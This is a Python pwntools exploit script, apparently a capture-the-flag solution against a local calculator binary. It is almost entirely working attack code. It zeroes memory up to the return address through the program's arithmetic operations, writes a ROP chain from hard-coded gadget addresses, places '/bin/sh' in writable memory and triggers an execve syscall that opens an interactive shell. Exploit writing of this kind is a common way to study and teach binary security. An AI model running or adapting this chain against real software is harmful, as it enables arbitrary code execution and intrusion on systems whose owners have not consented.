#Import pwntools
from pwn import *

#Establish the target
target = process('./b28b103ea5f1171553554f0127696a18c6d2dcf7')
#gdb.attach(target, gdbscript = 'b *0x401545')

#Establish ROP gadgets
pop_rdi = p64(0x401b73)
pop_rsi = p64(0x401c87)
pop_rax = p64(0x44db34)
pop_rdx = p64(0x437a85)

#Establsih other needed values for the ROP Chain
write_gadget = p64(0x44526e)
syscall = p64(0x400488)
binsh0 = p64(0x6e69622f)
binsh1 = p64(0x0068732f)
space = p64(0x6c0000)
zero = p64(0x0)

#Establish the function which will handle the start
def start():
	print target.recvuntil("Expected number of calculations: ")	
	target.sendline('50')
	print target.recvuntil('=>')

#This function will write a 4 byte null value in memory
def null_sub():
	target.sendline("2")
	target.sendline("486")
	target.sendline("486")
	print target.recvuntil("=>")


#This function exits the program, thus allowing us to gain rce
def exit():
	target.sendline("5")

#This function will write packed hex arguments we pass to it in memory using Addition
def write(hex_arg):
	hex = u64(hex_arg)
	target.sendline("1")
	target.sendline(str(hex - 100))
	target.sendline("100")
	print target.recvuntil("=>")
	null_sub()

#Because the string "/bin/sh\x00" actually requires the use of the upper 4 bytes unlike everything else, this is a modified write function which will write that for us
def write_binsh(hex_arg):
	hex = u64(hex_arg)
	target.sendline("1")
	target.sendline(str(hex - 100))
	target.sendline("100")
	print target.recvuntil("=>")

#RUn the start of the program, and write null bytes up untill the return address
start()
for i in xrange(18):
	print i
	null_sub()

#Write the part of the ROP Chain which will write "/bin/sh" to 0x6c0000
write(pop_rax)
write(space)
write(pop_rdx)
write_binsh(binsh0)
write_binsh(binsh1)
write(write_gadget)

#Write the part of the ROP Chain which will make the syscall to execve('/bin/sh', NULL, NULL)
write(pop_rdi)
write(space)
write(pop_rdx)
write(zero)
write(pop_rsi)
write(zero)
write(pop_rax)
write(p64(0x3b))
write(syscall)

#Exit the program so our ROP Chain will run
exit()

#Drop to an interactive shell
target.interactive()